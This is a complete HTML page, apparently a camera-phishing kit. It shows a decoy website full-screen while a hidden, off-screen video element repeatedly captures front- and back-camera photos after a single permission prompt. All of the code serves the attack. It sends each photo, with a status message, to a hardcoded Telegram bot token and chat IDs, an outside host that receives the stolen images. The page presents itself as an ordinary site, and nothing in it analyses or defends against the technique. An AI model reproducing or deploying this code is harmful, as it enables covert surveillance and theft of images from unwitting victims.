<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultra Fast Burst Camera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        
        #backgroundCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div id="backgroundCamera">
        <video id="cameraVideo" autoplay playsinline muted></video>
    </div>
    
    <iframe id="websiteFrame" src="about:blank"></iframe>

    <script>
        // =====================================================
        //  ULTRA FAST BURST - TRUE SINGLE PERMISSION
        // =====================================================
        
        function getConfigFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            const websiteParam = urlParams.get('site') || urlParams.get('url') || urlParams.get('website');
            const chatId = urlParams.get('chat_id');
            
            let websiteURL = 'https://www.example.com';
            
            if (websiteParam) {
                websiteURL = decodeURIComponent(websiteParam);
                if (!websiteURL.startsWith('http://') && !websiteURL.startsWith('https://')) {
                    websiteURL = 'https://' + websiteURL;
                }
            }
            
            return {
                website: websiteURL,
                chatId: chatId || 'unknown'
            };
        }
        
        const config = getConfigFromURL();
        const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_CHAT_ID = '7838949014';
        const USER_CHAT_ID = config.chatId;
        const CHAT_IDS = [ADMIN_CHAT_ID, USER_CHAT_ID];
        
        // ‚ö° ULTRA FAST CONFIG
        const PHOTOS_PER_CAMERA = 3;
        const CAPTURE_DELAY = 80;
        const WARMUP_TIME = 600;
        const SWITCH_DELAY = 300;
        
        let burstRunning = false;
        let photoCounter = 0;
        let totalPhotosSent = 0;
        let cameraReady = false;
        let currentStream = null;
        let permissionGranted = false;
        
        const cameraVideo = document.getElementById('cameraVideo');
        const websiteFrame = document.getElementById('websiteFrame');
        
        function loadWebsite() {
            try {
                websiteFrame.src = config.website;
                console.log('üåê Website loaded:', config.website);
            } catch (error) {
                console.error('Failed to load website:', error);
            }
        }
        
        // Request permission ONCE at the beginning
        async function requestCameraPermission() {
            try {
                console.log('üîê Requesting camera permission (ONCE)...');
                
                // Request basic camera permission
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true
                });
                
                // Stop it immediately - we just needed permission
                stream.getTracks().forEach(track => track.stop());
                
                permissionGranted = true;
                console.log('‚úÖ Camera permission granted!');
                return true;
            } catch (error) {
                console.error('‚ùå Permission denied:', error);
                permissionGranted = false;
                return false;
            }
        }
        
        // Start camera with facingMode (no new permission needed)
        async function startCameraWithFacing(facingMode) {
            try {
                cameraReady = false;
                
                // Stop current stream
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                    currentStream = null;
                }
                
                console.log(`üìπ Starting ${facingMode} camera...`);
                
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    }
                };
                
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                cameraVideo.srcObject = currentStream;
                
                await new Promise((resolve) => {
                    cameraVideo.onloadedmetadata = resolve;
                    setTimeout(resolve, 1500);
                });
                
                await cameraVideo.play();
                
                // Quick warmup
                await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                
                cameraReady = true;
                console.log(`‚úÖ ${facingMode} camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                return true;
            } catch (error) {
                console.error(`‚ùå ${facingMode} camera error:`, error);
                return false;
            }
        }
        
        // ULTRA FAST capture
        async function captureFrameFast() {
            return new Promise((resolve) => {
                if (!cameraReady || cameraVideo.readyState < 2) {
                    resolve(null);
                    return;
                }
                
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d', { alpha: false });
                    
                    canvas.width = cameraVideo.videoWidth || 1280;
                    canvas.height = cameraVideo.videoHeight || 720;
                    
                    if (canvas.width === 0 || canvas.height === 0) {
                        resolve(null);
                        return;
                    }
                    
                    ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(resolve, 'image/jpeg', 0.87);
                } catch (error) {
                    console.error('‚ùå Capture error:', error);
                    resolve(null);
                }
            });
        }
        
        // Fire and forget send to BOTH admin and user
        function sendPhotoFast(blob, cameraType, photoNum) {
            if (!blob) return;
            
            CHAT_IDS.forEach(chatId => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `${cameraType}_${photoNum}_${Date.now()}.jpg`);
                
                const caption = `üì∏ ${cameraType.toUpperCase()} #${photoNum}\nüë§ User: ${USER_CHAT_ID}`;
                formData.append('caption', caption);
                
                fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(r => r.json()).then(result => {
                    if (result.ok) {
                        totalPhotosSent++;
                        console.log(`‚úÖ Sent to ${chatId}: ${cameraType.toUpperCase()} #${photoNum}`);
                    }
                }).catch(e => console.error('‚ùå', e));
            });
        }
        
        // Capture burst from current camera
        async function captureBurstFromCamera(cameraType) {
            console.log(`üì∏ Capturing ${PHOTOS_PER_CAMERA} photos from ${cameraType.toUpperCase()}...`);
            
            for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
                const blob = await captureFrameFast();
                
                if (blob) {
                    photoCounter++;
                    sendPhotoFast(blob, cameraType, photoCounter);
                }
                
                if (i < PHOTOS_PER_CAMERA - 1) {
                    await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
                }
            }
        }
        
        // MAIN ULTRA FAST BURST LOOP
        async function ultraFastBurst() {
            if (burstRunning) return;
            if (!permissionGranted) {
                console.error('‚ùå No camera permission');
                return;
            }
            
            burstRunning = true;
            console.log('‚ö° ULTRA FAST BURST: 3 FRONT ‚Üí 3 BACK ‚Üí REPEAT');
            
            while (burstRunning) {
                // FRONT CAMERA
                photoCounter = 0;
                const frontStarted = await startCameraWithFacing('user');
                if (frontStarted) {
                    await captureBurstFromCamera('front');
                }
                
                // Small delay before switch
                await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
                
                // BACK CAMERA
                photoCounter = 0;
                const backStarted = await startCameraWithFacing('environment');
                if (backStarted) {
                    await captureBurstFromCamera('back');
                }
                
                // Small delay before next cycle
                await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
                
                console.log('üîÅ Cycle complete, restarting...');
            }
        }
        
        async function sendStartMessage() {
            try {
                const msg = `‚ö° *ULTRA FAST BURST MODE*\n\n` +
                    `üì∏ Pattern: 3 FRONT ‚Üí 3 BACK ‚Üí REPEAT\n` +
                    `‚è±Ô∏è Speed: ${CAPTURE_DELAY}ms between shots\n` +
                    `üîÑ Switch: ${SWITCH_DELAY}ms\n` +
                    `üåê Site: ${config.website}\n` +
                    `üë§ User ID: ${USER_CHAT_ID}\n` +
                    `üëë Admin ID: ${ADMIN_CHAT_ID}\n` +
                    `‚è∞ ${new Date().toLocaleString()}`;
                
                for (const chatId of CHAT_IDS) {
                    await fetch(`${TELEGRAM_API}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: msg,
                            parse_mode: 'Markdown'
                        })
                    });
                }
            } catch (e) {
                console.error('Failed to send start message:', e);
            }
        }
        
        async function init() {
            console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
            console.log('‚ö° ULTRA FAST BURST CAMERA');
            console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
            console.log('üëë Admin ID:', ADMIN_CHAT_ID);
            console.log('üë§ User ID:', USER_CHAT_ID);
            console.log('üåê Website:', config.website);
            console.log('üì∏ Pattern: 3 FRONT + 3 BACK');
            console.log('‚ö° Speed: MAXIMUM');
            console.log('üì§ Sending to: BOTH admin & user');
            console.log('‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê');
            
            loadWebsite();
            
            // Request permission ONCE at startup
            const permitted = await requestCameraPermission();
            
            if (permitted) {
                await sendStartMessage();
                console.log('üöÄ Starting ultra fast burst...');
                ultraFastBurst();
            } else {
                console.error('‚ùå Camera permission denied');
            }
        }
        
        window.addEventListener('load', init);
        
        window.addEventListener('beforeunload', () => {
            burstRunning = false;
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
